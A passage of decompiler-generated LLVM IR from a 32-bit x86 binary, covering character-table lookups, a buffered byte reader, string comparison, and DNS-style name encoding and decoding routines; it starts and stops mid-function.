  store i32 %arg1, i32* @edx, align 4
  %v1_8057234 = add i32 %arg1, 128
  %v6_805723f = icmp ugt i32 %v1_8057234, 383
  br i1 %v6_805723f, label %dec_label_pc_805724a, label %dec_label_pc_8057241

dec_label_pc_8057241:                             ; preds = %dec_label_pc_8057230
  %v0_8057241 = load i32, i32* bitcast (i32** @global_var_805e880.323 to i32*), align 128
  %v2_8057246 = mul i32 %arg1, 2
  %v3_8057246 = add i32 %v0_8057241, %v2_8057246
  %v4_8057246 = inttoptr i32 %v3_8057246 to i16*
  %v5_8057246 = load i16, i16* %v4_8057246, align 2
  %v6_8057246 = sext i16 %v5_8057246 to i32
  store i32 %v6_8057246, i32* @edx, align 4
  br label %dec_label_pc_805724a

dec_label_pc_805724a:                             ; preds = %dec_label_pc_8057230, %dec_label_pc_8057241
  %v0_805724a = phi i32 [ %arg1, %dec_label_pc_8057230 ], [ %v6_8057246, %dec_label_pc_8057241 ]
  ret i32 %v0_805724a

; uselistorder directives
  uselistorder label %dec_label_pc_805724a, { 1, 0 }
}

define i32 @function_8057250() local_unnamed_addr {
dec_label_pc_8057250:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_6()
  %stack_var_-5 = alloca i8, align 1
  %v0_8057250 = load i32, i32* @ebx, align 4
  %v4_8057254 = ptrtoint i16* %tmp to i32
  store i32 %v4_8057254, i32* @ebx, align 4
  %v1_8057258 = add i32 %v4_8057254, 16
  %v2_8057258 = inttoptr i32 %v1_8057258 to i32*
  %v3_8057258 = load i32, i32* %v2_8057258, align 4
  %v2_805725b = add i32 %v4_8057254, 24
  %v3_805725b = inttoptr i32 %v2_805725b to i32*
  %v4_805725b = load i32, i32* %v3_805725b, align 4
  %v10_805725b = icmp ult i32 %v3_8057258, %v4_805725b
  br i1 %v10_805725b, label %dec_label_pc_80572fd, label %dec_label_pc_8057264

dec_label_pc_8057264:                             ; preds = %dec_label_pc_8057250
  %v2_8057264 = load i16, i16* %tmp, align 2
  %v3_8057264 = zext i16 %v2_8057264 to i32
  %v1_8057267 = and i32 %v3_8057264, 131
  %v6_8057271 = icmp ugt i32 %v1_8057267, 128
  br i1 %v6_8057271, label %dec_label_pc_805728b, label %dec_label_pc_8057273

dec_label_pc_8057273:                             ; preds = %dec_label_pc_8057264
  %v0_8057273 = load i32, i32* @edx, align 4
  %v6_805727b = call i32 @function_805758c(i16* nonnull %tmp, i32 128, i32 %v0_8057273, i32 %v0_8057273)
  %v1_8057283 = icmp eq i32 %v6_805727b, 0
  %v1_8057285 = icmp eq i1 %v1_8057283, false
  br i1 %v1_8057285, label %dec_label_pc_8057322, label %dec_label_pc_8057273.dec_label_pc_805728b_crit_edge

dec_label_pc_8057273.dec_label_pc_805728b_crit_edge: ; preds = %dec_label_pc_8057273
  %v0_805728b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805728b

dec_label_pc_805728b:                             ; preds = %dec_label_pc_8057273.dec_label_pc_805728b_crit_edge, %dec_label_pc_8057264
  %v2_80572bf = phi i32 [ %v0_805728b.pre, %dec_label_pc_8057273.dec_label_pc_805728b_crit_edge ], [ %v4_8057254, %dec_label_pc_8057264 ]
  %v1_805728b = inttoptr i32 %v2_80572bf to i16*
  %v2_805728b = load i16, i16* %v1_805728b, align 2
  %v3_805728b = zext i16 %v2_805728b to i32
  store i32 %v3_805728b, i32* @ecx, align 4
  %v2_805728e = and i16 %v2_805728b, 2
  %v3_805728e = icmp eq i16 %v2_805728e, 0
  br i1 %v3_805728e, label %dec_label_pc_80572ae, label %dec_label_pc_8057293

dec_label_pc_8057293:                             ; preds = %dec_label_pc_805728b
  %tmp20 = urem i16 %v2_805728b, 2
  %v1_8057295 = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_8057295
  %v2_8057298 = and i32 %tmp19, 4
  %v3_8057298 = add i32 %v2_80572bf, 36
  %v4_8057298 = add i32 %v3_8057298, %v2_8057298
  %v5_8057298 = inttoptr i32 %v4_8057298 to i8*
  %v6_8057298 = load i8, i8* %v5_8057298, align 1
  %v7_8057298 = zext i8 %v6_8057298 to i32
  %v8_8057298 = load i32, i32* @edx, align 4
  %v9_8057298 = and i32 %v8_8057298, -256
  %v10_8057298 = or i32 %v9_8057298, %v7_8057298
  store i32 %v10_8057298, i32* %edx.global-to-local, align 4
  %v1_805729c = add i16 %v2_805728b, -1
  store i16 %v1_805729c, i16* %v1_805728b, align 2
  %v0_80572a2 = load i32, i32* @ebx, align 4
  %v1_80572a2 = add i32 %v0_80572a2, 40
  %v2_80572a2 = inttoptr i32 %v1_80572a2 to i32*
  store i32 0, i32* %v2_80572a2, align 4
  %v0_80572a9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80572a9 = urem i32 %v0_80572a9, 256
  store i32 %v1_80572a9, i32* @edx, align 4
  br label %dec_label_pc_8057325

dec_label_pc_80572ae:                             ; preds = %dec_label_pc_805728b
  %v1_80572ae = add i32 %v2_80572bf, 16
  %v2_80572ae = inttoptr i32 %v1_80572ae to i32*
  %v3_80572ae = load i32, i32* %v2_80572ae, align 4
  store i32 %v3_80572ae, i32* @eax, align 4
  %v1_80572b1 = add i32 %v2_80572bf, 20
  %v2_80572b1 = inttoptr i32 %v1_80572b1 to i32*
  %v3_80572b1 = load i32, i32* %v2_80572b1, align 4
  %v15_80572b1 = icmp eq i32 %v3_80572b1, %v3_80572ae
  %v1_80572b4 = icmp eq i1 %v15_80572b1, false
  br i1 %v1_80572b4, label %dec_label_pc_80572fd, label %dec_label_pc_80572b6

dec_label_pc_80572b6:                             ; preds = %dec_label_pc_80572ae
  %v1_80572b6 = add i32 %v2_80572bf, 4
  %v2_80572b6 = inttoptr i32 %v1_80572b6 to i32*
  %v3_80572b6 = load i32, i32* %v2_80572b6, align 4
  %v13_80572b6 = icmp eq i32 %v3_80572b6, -2
  %v1_80572ba = icmp eq i1 %v13_80572b6, false
  br i1 %v1_80572ba, label %dec_label_pc_80572c4, label %dec_label_pc_80572bc

dec_label_pc_80572bc:                             ; preds = %dec_label_pc_80572b6
  %v1_80572bc = or i32 %v3_805728b, 4
  store i32 %v1_80572bc, i32* @ecx, align 4
  %v1_80572bf = trunc i32 %v1_80572bc to i16
  store i16 %v1_80572bf, i16* %v1_805728b, align 2
  br label %dec_label_pc_8057322

dec_label_pc_80572c4:                             ; preds = %dec_label_pc_80572b6
  %v3_80572c4 = and i16 %v2_805728b, 768
  %v4_80572c4 = icmp eq i16 %v3_80572c4, 0
  br i1 %v4_80572c4, label %dec_label_pc_80572d9, label %dec_label_pc_80572c9

dec_label_pc_80572c9:                             ; preds = %dec_label_pc_80572c4
  %v3_80572d1 = call i32 @function_80563f8(i16* bitcast (i32** @global_var_805e63c.309 to i16*))
  %v0_80572d9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80572d9

dec_label_pc_80572d9:                             ; preds = %dec_label_pc_80572c4, %dec_label_pc_80572c9
  %v0_805730e = phi i32 [ %v2_80572bf, %dec_label_pc_80572c4 ], [ %v0_80572d9.pre, %dec_label_pc_80572c9 ]
  %v1_80572d9 = add i32 %v0_805730e, 8
  %v2_80572d9 = inttoptr i32 %v1_80572d9 to i32*
  %v3_80572d9 = load i32, i32* %v2_80572d9, align 4
  %v1_80572dc = add i32 %v0_805730e, 12
  %v2_80572dc = inttoptr i32 %v1_80572dc to i32*
  %v3_80572dc = load i32, i32* %v2_80572dc, align 4
  %v15_80572dc = icmp eq i32 %v3_80572dc, %v3_80572d9
  br i1 %v15_80572dc, label %dec_label_pc_8057306, label %dec_label_pc_80572e1

dec_label_pc_80572e1:                             ; preds = %dec_label_pc_80572d9
  %v2_80572e4 = add i32 %v0_805730e, 24
  %v3_80572e4 = inttoptr i32 %v2_80572e4 to i32*
  store i32 %v3_80572d9, i32* %v3_80572e4, align 4
  %v0_80572e7 = load i32, i32* @ebx, align 4
  %v2_80572e8 = call i32 @function_8057564(i32 %v0_80572e7)
  %v1_80572f0 = icmp eq i32 %v2_80572e8, 0
  br i1 %v1_80572f0, label %dec_label_pc_8057322, label %dec_label_pc_80572f4

dec_label_pc_80572f4:                             ; preds = %dec_label_pc_80572e1
  %v0_80572f4 = load i32, i32* @ebx, align 4
  %v1_80572f4 = add i32 %v0_80572f4, 20
  %v2_80572f4 = inttoptr i32 %v1_80572f4 to i32*
  %v3_80572f4 = load i32, i32* %v2_80572f4, align 4
  %v2_80572f7 = add i32 %v0_80572f4, 24
  %v3_80572f7 = inttoptr i32 %v2_80572f7 to i32*
  store i32 %v3_80572f4, i32* %v3_80572f7, align 4
  %v0_80572fa = load i32, i32* @ebx, align 4
  %v1_80572fa = add i32 %v0_80572fa, 16
  %v2_80572fa = inttoptr i32 %v1_80572fa to i32*
  %v3_80572fa = load i32, i32* %v2_80572fa, align 4
  br label %dec_label_pc_80572fd

dec_label_pc_80572fd:                             ; preds = %dec_label_pc_80572ae, %dec_label_pc_8057250, %dec_label_pc_80572f4
  %v1_8057301 = phi i32 [ %v2_80572bf, %dec_label_pc_80572ae ], [ %v4_8057254, %dec_label_pc_8057250 ], [ %v0_80572fa, %dec_label_pc_80572f4 ]
  %v0_80572fd = phi i32 [ %v3_80572ae, %dec_label_pc_80572ae ], [ %v3_8057258, %dec_label_pc_8057250 ], [ %v3_80572fa, %dec_label_pc_80572f4 ]
  %v1_80572fd = inttoptr i32 %v0_80572fd to i8*
  %v2_80572fd = load i8, i8* %v1_80572fd, align 1
  %v3_80572fd = zext i8 %v2_80572fd to i32
  store i32 %v3_80572fd, i32* @edx, align 4
  %v1_8057300 = add i32 %v0_80572fd, 1
  %v2_8057301 = add i32 %v1_8057301, 16
  %v3_8057301 = inttoptr i32 %v2_8057301 to i32*
  store i32 %v1_8057300, i32* %v3_8057301, align 4
  %v0_8057328.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8057325

dec_label_pc_8057306:                             ; preds = %dec_label_pc_80572d9
  %v2_8057309 = ptrtoint i8* %stack_var_-5 to i32
  %v5_805730e = inttoptr i32 %v0_805730e to i16*
  %v5_805730f = call i32 @function_8057514(i16* %v5_805730e, i32 %v2_8057309, i32 1)
  %v1_8057317 = icmp eq i32 %v5_805730f, 0
  br i1 %v1_8057317, label %dec_label_pc_8057322, label %dec_label_pc_805731b

dec_label_pc_805731b:                             ; preds = %dec_label_pc_8057306
  %v3_805731b = load i8, i8* %stack_var_-5, align 1
  %v4_805731b = sext i8 %v3_805731b to i32
  store i32 %v4_805731b, i32* @edx, align 4
  br label %dec_label_pc_8057325

dec_label_pc_8057322:                             ; preds = %dec_label_pc_8057306, %dec_label_pc_80572e1, %dec_label_pc_8057273, %dec_label_pc_80572bc
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8057325

dec_label_pc_8057325:                             ; preds = %dec_label_pc_805731b, %dec_label_pc_80572fd, %dec_label_pc_8057293, %dec_label_pc_8057322
  %v0_8057328 = phi i32 [ %v4_805731b, %dec_label_pc_805731b ], [ %v0_8057328.pre, %dec_label_pc_80572fd ], [ %v1_80572a9, %dec_label_pc_8057293 ], [ -1, %dec_label_pc_8057322 ]
  store i32 %v0_8057250, i32* @ebx, align 4
  ret i32 %v0_8057328

; uselistorder directives
  uselistorder i32 %v0_80572fd, { 1, 0 }
  uselistorder i32 %v3_80572d9, { 1, 0 }
  uselistorder i32 %v0_805730e, { 0, 1, 3, 2 }
  uselistorder i32 %v3_80572ae, { 1, 0, 2 }
  uselistorder i32 %v1_80572a9, { 1, 0 }
  uselistorder i16 %v2_805728b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80572bf, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i16* @global_var_805e680.302, { 1, 0, 2 }
  uselistorder i32 -2, { 0, 2, 6, 13, 14, 1, 17, 16, 3, 5, 4, 18, 7, 8, 9, 15, 10, 11, 12 }
  uselistorder i32 40, { 7, 8, 9, 2, 10, 11, 1, 3, 4, 5, 6, 0 }
  uselistorder i32 -256, { 47, 1, 48, 0, 49, 12, 14, 50, 52, 3, 16, 15, 2, 53, 54, 55, 56, 6, 57, 4, 58, 5, 59, 60, 8, 18, 17, 7, 21, 22, 23, 24, 25, 26, 27, 28, 13, 29, 42, 43, 61, 63, 62, 46, 45, 9, 40, 51, 30, 31, 32, 33, 34, 35, 36, 10, 37, 38, 19, 20, 11, 39, 41, 44 }
  uselistorder i32 36, { 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 1, 19, 2, 3, 20, 4, 5, 6, 7, 8, 0 }
  uselistorder i16 2, { 0, 3, 1, 2, 4 }
  uselistorder i32 128, { 4, 11, 20, 10, 12, 5, 6, 7, 13, 0, 8, 9, 14, 15, 16, 17, 18, 3, 2, 19, 1 }
  uselistorder i32 131, { 2, 1, 0 }
  uselistorder i32 24, { 23, 24, 25, 26, 27, 28, 29, 13, 0, 21, 3, 4, 12, 5, 14, 15, 16, 17, 18, 19, 20, 30, 2, 6, 7, 8, 9, 10, 11, 1, 22 }
  uselistorder label %dec_label_pc_8057325, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8057322, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_80572fd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80572d9, { 1, 0 }
}

define i32 @function_805732c(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805732c:
  %v0_805732d = load i32, i32* bitcast (i32** @global_var_805e880.323 to i32*), align 128
  %v4_8057336 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_805733e

dec_label_pc_805733e:                             ; preds = %dec_label_pc_805735b, %dec_label_pc_805732c
  %storemerge = phi i32 [ %v4_8057336, %dec_label_pc_805732c ], [ %v1_805735c, %dec_label_pc_805735b ]
  %v0_805735c = phi i32 [ %v4_8057336, %dec_label_pc_805732c ], [ %v1_805735c, %dec_label_pc_805735b ]
  %v0_80573616 = phi i32 [ 0, %dec_label_pc_805732c ], [ %v0_80573617, %dec_label_pc_805735b ]
  %v0_805735b = phi i32 [ %arg2, %dec_label_pc_805732c ], [ %v1_805735b, %dec_label_pc_805735b ]
  store i32 %storemerge, i32* @ecx, align 4
  %v12_805733e = icmp eq i32 %v0_805735c, %v0_805735b
  %.pre = inttoptr i32 %v0_805735c to i8*
  br i1 %v12_805733e, label %dec_label_pc_8057356, label %dec_label_pc_8057342

dec_label_pc_8057342:                             ; preds = %dec_label_pc_805733e
  %v2_8057342 = load i8, i8* %.pre, align 1
  %v3_8057342 = zext i8 %v2_8057342 to i32
  %v2_8057345 = mul nuw nsw i32 %v3_8057342, 2
  %v3_8057345 = add i32 %v2_8057345, %v0_805732d
  %v4_8057345 = inttoptr i32 %v3_8057345 to i16*
  %v5_8057345 = load i16, i16* %v4_8057345, align 2
  %v6_8057345 = sext i16 %v5_8057345 to i32
  %v1_8057349 = inttoptr i32 %v0_805735b to i8*
  %v2_8057349 = load i8, i8* %v1_8057349, align 1
  %v3_8057349 = zext i8 %v2_8057349 to i32
  %v2_805734c = mul nuw nsw i32 %v3_8057349, 2
  %v3_805734c = add i32 %v2_805734c, %v0_805732d
  %v4_805734c = inttoptr i32 %v3_805734c to i16*
  %v5_805734c = load i16, i16* %v4_805734c, align 2
  %v6_805734c = sext i16 %v5_805734c to i32
  %v2_8057350 = sub nsw i32 %v6_8057345, %v6_805734c
  %v12_8057350 = icmp eq i32 %v2_8057350, 0
  store i32 %v2_8057350, i32* @edx, align 4
  %v1_8057354 = icmp eq i1 %v12_8057350, false
  br i1 %v1_8057354, label %dec_label_pc_805735f, label %dec_label_pc_8057356

dec_label_pc_8057356:                             ; preds = %dec_label_pc_805733e, %dec_label_pc_8057342
  %v0_80573617 = phi i32 [ %v2_8057350, %dec_label_pc_8057342 ], [ %v0_80573616, %dec_label_pc_805733e ]
  %v2_8057356 = load i8, i8* %.pre, align 1
  %v3_8057356 = icmp eq i8 %v2_8057356, 0
  br i1 %v3_8057356, label %dec_label_pc_805735f, label %dec_label_pc_805735b

dec_label_pc_805735b:                             ; preds = %dec_label_pc_8057356
  %v1_805735b = add i32 %v0_805735b, 1
  %v1_805735c = add i32 %v0_805735c, 1
  br label %dec_label_pc_805733e

dec_label_pc_805735f:                             ; preds = %dec_label_pc_8057356, %dec_label_pc_8057342
  %v0_8057361 = phi i32 [ %v0_80573617, %dec_label_pc_8057356 ], [ %v2_8057350, %dec_label_pc_8057342 ]
  ret i32 %v0_8057361

; uselistorder directives
  uselistorder i32 %v1_805735c, { 1, 0 }
  uselistorder i32 %v0_80573617, { 1, 0 }
  uselistorder i32 %v2_8057350, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805735b, { 1, 2, 0 }
  uselistorder i32 %v0_805735c, { 2, 1, 0 }
  uselistorder i32 65536, { 1, 0, 2, 3, 4, 6, 5, 8, 7, 10, 9, 12, 11, 13, 14, 33, 35, 15, 17, 16, 18, 19, 22, 23, 24, 20, 25, 21, 27, 26, 28, 30, 29, 32, 31, 34 }
  uselistorder label %dec_label_pc_8057356, { 1, 0 }
}

define i32 @function_8057364(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8057364:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8057365 = load i32, i32* @edi, align 4
  %v0_8057366 = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_805736d = ptrtoint i8* %arg1 to i32
  store i32 %v4_805736d, i32* @edi, align 4
  %v1_80573cc5 = icmp eq i8* %arg1, null
  br i1 %v1_80573cc5, label %dec_label_pc_80573d5, label %dec_label_pc_80573d0.lr.ph

dec_label_pc_80573d0.lr.ph:                       ; preds = %dec_label_pc_8057364
  br label %dec_label_pc_80573d0

dec_label_pc_8057373:                             ; preds = %dec_label_pc_80573d0
  %v5_8057378 = call i32 @function_8051ebc(i8* %v1_80573d0, i32 46)
  %v1_8057380 = icmp eq i32 %v5_8057378, 0
  br i1 %v1_8057380, label %dec_label_pc_805738c, label %dec_label_pc_8057386

dec_label_pc_8057386:                             ; preds = %dec_label_pc_8057373
  %v1_8057388 = load i32, i32* @edi, align 4
  %v2_8057388 = sub i32 %v5_8057378, %v1_8057388
  br label %dec_label_pc_805739a

dec_label_pc_805738c:                             ; preds = %dec_label_pc_8057373
  %v0_805738f = load i32, i32* @edi, align 4
  %v5_805738f = inttoptr i32 %v0_805738f to i8*
  %v3_8057390 = call i32 @function_8051ef8(i8* %v5_805738f)
  br label %dec_label_pc_805739a

dec_label_pc_805739a:                             ; preds = %dec_label_pc_8057386, %dec_label_pc_805738c
  %v0_80573ad = phi i32 [ %v2_8057388, %dec_label_pc_8057386 ], [ %v3_8057390, %dec_label_pc_805738c ]
  store i32 %v0_80573ad, i32* @esi, align 4
  %v1_805739a = icmp eq i32 %v0_80573ad, 0
  %v3_805739a = trunc i32 %v0_80573ad to i8
  br i1 %v1_805739a, label %dec_label_pc_80573e9, label %dec_label_pc_805739e

dec_label_pc_805739e:                             ; preds = %dec_label_pc_805739a
  %v1_80573a2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80573a2 = sub i32 %arg3, %v1_80573a2
  %v1_80573a4 = add i32 %v2_80573a2, -1
  %v7_80573a5 = icmp ult i32 %v0_80573ad, %v1_80573a4
  %v1_80573a7 = icmp eq i1 %v7_80573a5, false
  br i1 %v1_80573a7, label %dec_label_pc_80573e9, label %dec_label_pc_80573a9

dec_label_pc_80573a9:                             ; preds = %dec_label_pc_805739e
  store i32 %arg2, i32* @edx, align 4
  %v4_80573af = add i32 %v1_80573a2, %arg2
  %v5_80573af = inttoptr i32 %v4_80573af to i8*
  store i8 %v3_805739a, i8* %v5_80573af, align 1
  %v0_80573b2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80573b2 = add i32 %v0_80573b2, 1
  %v0_80573b4 = load i32, i32* @edx, align 4
  %v0_80573b6 = load i32, i32* @esi, align 4
  %v2_80573b7 = add i32 %v1_80573b2, %v0_80573b4
  %v0_80573b9 = load i32, i32* @edi, align 4
  %v2_80573ba = add i32 %v0_80573b6, %v1_80573b2
  store i32 %v2_80573ba, i32* %ebx.global-to-local, align 4
  %tmp30 = inttoptr i32 %v2_80573b7 to i16*
  %v7_80573bd = call i32 @function_8051e5c(i16* %tmp30, i32 %v0_80573b9, i32 %v0_80573b6)
  %v1_80573c9 = add i32 %v5_8057378, 1
  br i1 %v1_8057380, label %dec_label_pc_80573d5, label %dec_label_pc_80573cc

dec_label_pc_80573cc:                             ; preds = %dec_label_pc_80573a9
  store i32 %v1_80573c9, i32* @edi, align 4
  %v1_80573cc = icmp eq i32 %v1_80573c9, 0
  br i1 %v1_80573cc, label %dec_label_pc_80573d5, label %dec_label_pc_80573d0

dec_label_pc_80573d0:                             ; preds = %dec_label_pc_80573d0.lr.ph, %dec_label_pc_80573cc
  %v0_8057377 = phi i32 [ %v4_805736d, %dec_label_pc_80573d0.lr.ph ], [ %v1_80573c9, %dec_label_pc_80573cc ]
  %v1_80573d0 = inttoptr i32 %v0_8057377 to i8*
  %v2_80573d0 = load i8, i8* %v1_80573d0, align 1
  %v3_80573d0 = icmp eq i8 %v2_80573d0, 0
  %v1_80573d3 = icmp eq i1 %v3_80573d0, false
  br i1 %v1_80573d3, label %dec_label_pc_8057373, label %dec_label_pc_80573d5

dec_label_pc_80573d5:                             ; preds = %dec_label_pc_80573cc, %dec_label_pc_80573d0, %dec_label_pc_80573a9, %dec_label_pc_8057364
  %tmp31 = icmp slt i32 %arg3, 1
  br i1 %tmp31, label %dec_label_pc_80573e9, label %dec_label_pc_80573dc

dec_label_pc_80573dc:                             ; preds = %dec_label_pc_80573d5
  %v1_80573e0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80573e0 = add i32 %v1_80573e0, %arg2
  %v3_80573e0 = inttoptr i32 %v2_80573e0 to i8*
  store i8 0, i8* %v3_80573e0, align 1
  %v0_80573e4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80573e4 = add i32 %v0_80573e4, 1
  br label %dec_label_pc_80573ec

dec_label_pc_80573e9:                             ; preds = %dec_label_pc_805739e, %dec_label_pc_805739a, %dec_label_pc_80573d5
  br label %dec_label_pc_80573ec

dec_label_pc_80573ec:                             ; preds = %dec_label_pc_80573dc, %dec_label_pc_80573e9
  %storemerge3 = phi i32 [ %v1_80573e4, %dec_label_pc_80573dc ], [ -1, %dec_label_pc_80573e9 ]
  store i32 %v0_8057366, i32* @esi, align 4
  store i32 %v0_8057365, i32* @edi, align 4
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i8* %v1_80573d0, { 1, 0 }
  uselistorder i32 %v1_80573c9, { 0, 2, 1 }
  uselistorder i32 %v0_80573b6, { 1, 0 }
  uselistorder i32 %v5_8057378, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @function_8051ef8, { 6, 0, 1, 7, 8, 3, 4, 5, 2 }
  uselistorder i32 (i8*, i32)* @function_8051ebc, { 2, 3, 4, 0, 1 }
  uselistorder i32 46, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i8* null, { 4, 3, 2, 7, 0, 1, 6, 8, 9, 5, 10, 11, 12, 13 }
  uselistorder label %dec_label_pc_80573ec, { 1, 0 }
  uselistorder label %dec_label_pc_80573e9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80573d5, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80573d0, { 1, 0 }
  uselistorder label %dec_label_pc_805739a, { 1, 0 }
}

define i32 @function_80573f4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80573f4:
  %ebp.global-to-local = alloca i32, align 4
  %v0_80573f6 = load i32, i32* @esi, align 4
  %v4_80573fb = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_80573fb, label %dec_label_pc_80574c2, label %dec_label_pc_805740a

dec_label_pc_805740a:                             ; preds = %dec_label_pc_80573f4
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80574aa2541 = add i32 %arg2, %arg1
  %v3_80574aa2642 = inttoptr i32 %v2_80574aa2541 to i8*
  %v4_80574aa2743 = load i8, i8* %v3_80574aa2642, align 1
  %v1_80574ae2945 = icmp eq i8 %v4_80574aa2743, 0
  %v1_80574b03046 = icmp eq i1 %v1_80574ae2945, false
  br i1 %v1_80574b03046, label %dec_label_pc_8057418.lr.ph, label %dec_label_pc_80574b6

dec_label_pc_8057418:                             ; preds = %dec_label_pc_8057418.lr.ph, %dec_label_pc_8057431
  %v0_8057422 = phi i32 [ %v0_8057422.pre, %dec_label_pc_8057418.lr.ph ], [ %v4_8057442, %dec_label_pc_8057431 ]
  %v8_805741837 = phi i1 [ %v8_80574183151, %dec_label_pc_8057418.lr.ph ], [ true, %dec_label_pc_8057431 ]
  %v5_80574aa36.in = phi i8 [ %v5_80574aa2850.in, %dec_label_pc_8057418.lr.ph ], [ %v4_80574aa, %dec_label_pc_8057431 ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_8057418.lr.ph ], [ 0, %dec_label_pc_8057431 ]
  %v0_805741f34 = phi i32 [ %v0_805741f.ph47, %dec_label_pc_8057418.lr.ph ], [ %v2_8057450, %dec_label_pc_8057431 ]
  %v5_80574aa36 = zext i8 %v5_80574aa36.in to i32
  %v1_805741f = add i32 %v0_805741f34, 1
  store i32 %v1_805741f, i32* @esi, align 4
  %v3_8057422 = select i1 %v8_805741837, i32 2, i32 1
  %v4_8057422 = add i32 %v3_8057422, %v0_8057422
  store i32 %v4_8057422, i32* %ebp.global-to-local, align 4
  %v1_8057425 = and i32 %v5_80574aa36, 192
  %v6_805742a = icmp eq i32 %v1_8057425, 192
  %v1_805742f = icmp eq i1 %v6_805742a, false
  br i1 %v1_805742f, label %dec_label_pc_8057454, label %dec_label_pc_8057431

dec_label_pc_8057431:                             ; preds = %dec_label_pc_8057418
  %v2_805743e = add i32 %v1_805741f, %arg1
  %v3_805743e = inttoptr i32 %v2_805743e to i8*
  %v4_805743e = load i8, i8* %v3_805743e, align 1
  %v5_805743e = zext i8 %v4_805743e to i32
  %v4_8057442 = add i32 %v3_8057422, %v4_8057422
  store i32 %v4_8057442, i32* %ebp.global-to-local, align 4
  %v1_8057445 = mul nuw nsw i32 %v5_80574aa36, 256
  %v2_8057448 = and i32 %v1_8057445, 16128
  %v2_8057450 = or i32 %v5_805743e, %v2_8057448
  store i32 %v2_8057450, i32* @edx, align 4
  store i32 %v1_8057471.ph48, i32* @ecx, align 4
  %v2_80574aa = add i32 %v2_8057450, %arg1
  %v3_80574aa = inttoptr i32 %v2_80574aa to i8*
  %v4_80574aa = load i8, i8* %v3_80574aa, align 1
  %v1_80574ae = icmp eq i8 %v4_80574aa, 0
  %v1_80574b0 = icmp eq i1 %v1_80574ae, false
  br i1 %v1_80574b0, label %dec_label_pc_8057418, label %dec_label_pc_80574b6

dec_label_pc_8057454:                             ; preds = %dec_label_pc_8057418
  %v2_8057454 = add i32 %v5_80574aa36, %v1_8057471.ph48
  %v1_8057459 = add i32 %v2_8057454, 1
  store i32 %v1_8057459, i32* @edi, align 4
  %v10_805745a = icmp ult i32 %v1_8057459, %arg4
  %v1_8057462 = icmp eq i1 %v10_805745a, false
  br i1 %v1_8057462, label %dec_label_pc_80574c2, label %dec_label_pc_8057464

dec_label_pc_8057464:                             ; preds = %dec_label_pc_8057454
  %v2_805746a = add i32 %v1_805741f, %arg1
  %v2_8057471 = add i32 %v1_8057471.ph48, %arg3
  %v3_8057474 = inttoptr i32 %v2_8057471 to i16*
  %v4_8057474 = call i32 @function_8051e5c(i16* %v3_8057474, i32 %v2_805746a, i32 %v5_80574aa36)
  %v0_8057480 = load i32, i32* %ebp.global-to-local, align 4
  %v0_8057489 = load i32, i32* @esi, align 4
  %v2_8057489 = add i32 %v0_8057489, %v5_80574aa36
  store i32 %v2_8057489, i32* @edx, align 4
  %v1_8057490 = icmp eq i1 %v8_805741837, false
  %v2_8057480 = select i1 %v1_8057490, i32 %v5_80574aa36, i32 0
  %v4_8057490 = add i32 %v0_8057480, %v2_8057480
  store i32 %v4_8057490, i32* %ebp.global-to-local, align 4
  %v4_80574a1 = add i32 %v2_8057454, %arg3
  %v5_80574a1 = inttoptr i32 %v4_80574a1 to i8*
  store i8 46, i8* %v5_80574a1, align 1
  %v0_80574a4.pre = load i32, i32* @edi, align 4
  %v1_80574aa.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_80574a4.pre, i32* @ecx, align 4
  %v2_80574aa25 = add i32 %v1_80574aa.pre.pre, %arg1
  %v3_80574aa26 = inttoptr i32 %v2_80574aa25 to i8*
  %v4_80574aa27 = load i8, i8* %v3_80574aa26, align 1
  %v1_80574ae29 = icmp eq i8 %v4_80574aa27, 0
  %v1_80574b030 = icmp eq i1 %v1_80574ae29, false
  %v8_805741831 = icmp eq i8 %stack_var_-17.135, 0
  %v0_8057422.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_80574b030, label %dec_label_pc_8057418.lr.ph, label %dec_label_pc_80574b6

dec_label_pc_8057418.lr.ph:                       ; preds = %dec_label_pc_8057464, %dec_label_pc_805740a
  %v0_8057422.pre = phi i32 [ 0, %dec_label_pc_805740a ], [ %v0_8057422.pre.pre, %dec_label_pc_8057464 ]
  %v8_80574183151 = phi i1 [ false, %dec_label_pc_805740a ], [ %v8_805741831, %dec_label_pc_8057464 ]
